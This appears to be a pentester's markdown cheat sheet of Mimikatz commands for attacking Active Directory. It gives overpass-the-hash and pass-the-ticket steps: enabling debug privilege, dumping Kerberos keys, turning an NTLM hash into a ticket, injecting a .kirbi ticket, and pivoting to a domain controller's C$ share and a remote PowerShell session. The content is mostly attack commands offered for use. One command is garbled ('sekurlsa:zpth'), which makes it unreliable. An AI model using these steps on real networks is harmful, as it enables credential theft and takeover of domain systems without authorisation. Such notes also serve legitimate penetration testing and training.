# Mimikatz - AD

## mimikatz - PtK / OverPass the hash
```
# PtT : Convert hash/key for a domain-joined user into TGT

privilege::debug

sekurlsa::ekeys

# Convert
sekurlsa:zpth /domain:<DOMAIN> /user:<USERNAME> /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# Open cmd.exe within the context of the targetted user
```

## mimikatz - PtT
```
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-blah.blah.kirbi"
# Ticket are loaded in the current session

misc::cmd
# or exit

# Pivoting
#  try to access a share
dir \\DC01.<DOMAIN>\c$

# Connect to taget machine as the user whose ticket we imported
Enter-PSSession -ComputerName DC01
```
